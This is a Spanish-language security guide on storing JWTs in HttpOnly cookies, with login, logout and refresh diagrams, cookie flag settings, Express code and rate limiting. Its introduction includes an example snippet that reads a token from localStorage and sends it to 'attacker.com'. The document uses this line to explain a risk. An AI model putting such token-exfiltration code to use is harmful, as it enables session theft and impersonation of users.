# Autenticación y Cookies: Guía de Seguridad

## Introducción

Este documento explica la estrategia de autenticación adoptada en el proyecto, centrada en el uso de **JWT (JSON Web Tokens) almacenados en cookies HttpOnly** en lugar de localStorage, junto con el flujo de login/logout y las medidas de seguridad implementadas.

## ¿Por qué JWT en Cookies HttpOnly vs localStorage?

### Vulnerabilidades de localStorage

Almacenar tokens de autenticación en `localStorage` expone la aplicación a ataques **XSS (Cross-Site Scripting)**:

- JavaScript malicioso inyectado puede acceder directamente a `localStorage`
- Un atacante puede robar el token y suplantar al usuario
- No hay protección nativa del navegador contra este tipo de acceso

```javascript
// ⚠️ Vulnerable: Un script malicioso puede hacer esto
const token = localStorage.getItem('authToken');
// Enviar token a servidor del atacante
fetch('https://attacker.com/steal?token=' + token);
```

### Ventajas de Cookies HttpOnly

| Característica | localStorage | Cookie HttpOnly |
|---------------|--------------|-----------------|
| Acceso desde JavaScript | ✅ Sí | ❌ No |
| Protección XSS | ❌ Vulnerable | ✅ Mitigado |
| Envío automático | ❌ Manual | ✅ Automático |
| CSRF Protection | N/A | Requiere configuración |

Las cookies con flag `HttpOnly` **no son accesibles desde JavaScript**, lo que mitiga significativamente los ataques XSS:

```javascript
// ❌ Esto NO funciona con cookies HttpOnly
document.cookie // No puede leer cookies HttpOnly
```

## Diagrama de Secuencia: Flujo de Login

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  Cliente │                    │   API    │                    │ MongoDB  │
│ (Browser)│                    │ (Backend)│                    │          │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │  1. POST /auth/login          │                               │
     │  {email, password}            │                               │
     │──────────────────────────────>│                               │
     │                               │                               │
     │                               │  2. Buscar usuario            │
     │                               │──────────────────────────────>│
     │                               │                               │
     │                               │  3. Usuario encontrado        │
     │                               │<──────────────────────────────│
     │                               │                               │
     │                               │  4. Verificar password        │
     │                               │  (bcrypt.compare)             │
     │                               │                               │
     │                               │  5. Generar JWT               │
     │                               │  (access + refresh token)     │
     │                               │                               │
     │  6. Set-Cookie: accessToken   │                               │
     │     Set-Cookie: refreshToken  │                               │
     │     200 OK + user data        │                               │
     │<──────────────────────────────│                               │
     │                               │                               │
     │  7. Solicitud autenticada     │                               │
     │  Cookie: accessToken=...      │                               │
     │──────────────────────────────>│                               │
     │                               │                               │
     │                               │  8. Verificar JWT             │
     │                               │  (middleware)                 │
     │                               │                               │
     │  9. Respuesta protegida       │                               │
     │<──────────────────────────────│                               │
     │                               │                               │
```

## Diagrama de Secuencia: Flujo de Logout

```
┌──────────┐                    ┌──────────┐
│  Cliente │                    │   API    │
│ (Browser)│                    │ (Backend)│
└────┬─────┘                    └────┬─────┘
     │                               │
     │  1. POST /auth/logout         │
     │  Cookie: accessToken=...      │
     │──────────────────────────────>│
     │                               │
     │                               │  2. Invalidar refresh token
     │                               │     (si se usa blacklist)
     │                               │
     │  3. Set-Cookie: accessToken   │
     │     (maxAge=0, clear cookie)  │
     │     Set-Cookie: refreshToken  │
     │     (maxAge=0, clear cookie)  │
     │     200 OK                    │
     │<──────────────────────────────│
     │                               │
```

## Ejemplo de Cabeceras Set-Cookie

### Configuración Recomendada para Producción

```http
HTTP/1.1 200 OK
Set-Cookie: accessToken=eyJhbGciOiJIUzI1NiIs...; 
    HttpOnly; 
    Secure; 
    SameSite=Strict; 
    Path=/; 
    Max-Age=900

Set-Cookie: refreshToken=eyJhbGciOiJIUzI1NiIs...; 
    HttpOnly; 
    Secure; 
    SameSite=Strict; 
    Path=/auth/refresh; 
    Max-Age=604800
```

### Explicación de los Flags

| Flag | Descripción | Importancia |
|------|-------------|-------------|
| `HttpOnly` | Impide acceso desde JavaScript | **Crítico** - Mitiga XSS |
| `Secure` | Solo se envía sobre HTTPS | **Crítico** - Previene intercepción |
| `SameSite=Strict` | No se envía en peticiones cross-site | **Alto** - Mitiga CSRF |
| `Path` | Limita el scope de la cookie | Medio - Principio de mínimo privilegio |
| `Max-Age` | Tiempo de expiración en segundos | Medio - Limita ventana de ataque |

### Implementación en Node.js/Express

```typescript
// Configuración de cookie para el access token
res.cookie('accessToken', accessToken, {
  httpOnly: true,           // No accesible desde JavaScript
  secure: process.env.NODE_ENV === 'production', // Solo HTTPS en producción
  sameSite: 'strict',       // Protección CSRF
  maxAge: 15 * 60 * 1000,   // 15 minutos
  path: '/'
});

// Configuración de cookie para el refresh token
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 días
  path: '/auth/refresh'     // Solo enviado al endpoint de refresh
});
```

## Estrategia de Refresh Tokens

### ¿Por qué usar Refresh Tokens?

1. **Access tokens de corta duración** (15 min): Limita el daño si se compromete
2. **Refresh tokens de larga duración** (7 días): Mejor UX sin re-login constante
3. **Rotación de tokens**: Cada refresh genera nuevos tokens

### Flujo de Refresh

```
┌──────────┐                    ┌──────────┐
│  Cliente │                    │   API    │
└────┬─────┘                    └────┬─────┘
     │                               │
     │  1. Petición con accessToken  │
     │     expirado                  │
     │──────────────────────────────>│
     │                               │
     │  2. 401 Unauthorized          │
     │<──────────────────────────────│
     │                               │
     │  3. POST /auth/refresh        │
     │     Cookie: refreshToken=...  │
     │──────────────────────────────>│
     │                               │
     │  4. Set-Cookie: accessToken   │
     │     (nuevo token)             │
     │     Set-Cookie: refreshToken  │
     │     (rotación)                │
     │<──────────────────────────────│
     │                               │
     │  5. Reintentar petición       │
     │     original                  │
     │──────────────────────────────>│
     │                               │
```

## Rate Limiting

Para prevenir ataques de fuerza bruta en los endpoints de autenticación, se implementa **rate limiting**:

### Configuración Recomendada

```typescript
import rateLimit from 'express-rate-limit';

// Rate limiter para endpoints de autenticación
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5,                   // 5 intentos por ventana
  message: {
    error: 'Demasiados intentos de login. Intente de nuevo en 15 minutos.'
  },
  standardHeaders: true,    // Devuelve info en headers `RateLimit-*`
  legacyHeaders: false,
});

// Aplicar a rutas de auth
app.use('/auth/login', authLimiter);
app.use('/auth/register', authLimiter);
```

### Cabeceras de Rate Limit

```http
HTTP/1.1 429 Too Many Requests
Retry-After: 900
RateLimit-Limit: 5
RateLimit-Remaining: 0
RateLimit-Reset: 1706889600
```

## Checklist de Seguridad

- [ ] JWT almacenado en cookie HttpOnly
- [ ] Flag `Secure` habilitado en producción
- [ ] `SameSite=Strict` configurado
- [ ] Refresh tokens con rotación
- [ ] Rate limiting en endpoints de auth
- [ ] Tokens con expiración corta (access) y larga (refresh)
- [ ] HTTPS obligatorio en producción
- [ ] Validación de input en login/registro

## Referencias

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [RFC 6265: HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)
